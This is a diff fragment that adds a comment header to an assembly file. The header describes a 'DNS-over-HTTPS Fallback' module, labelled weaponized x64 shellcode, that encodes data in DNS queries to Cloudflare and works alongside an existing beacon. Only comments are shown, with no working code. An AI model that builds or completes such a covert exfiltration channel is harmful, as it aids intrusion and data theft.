@@ -1,3 +1,10 @@
+; ========================================================
+; DNS-over-HTTPS Fallback – encodes data in DNS queries to Cloudflare
+; File: dns_over_https.asm
+; Created: 2026-02-20
+; Purpose: x64 shellcode
+; WARNING: Weaponized code – handle with extreme care.
+; ========================================================
 ; ============================================================================
 ; Module: DNS-over-HTTPS Fallback
 ; Integrates with existing beacon (uses same API resolution mechanism)
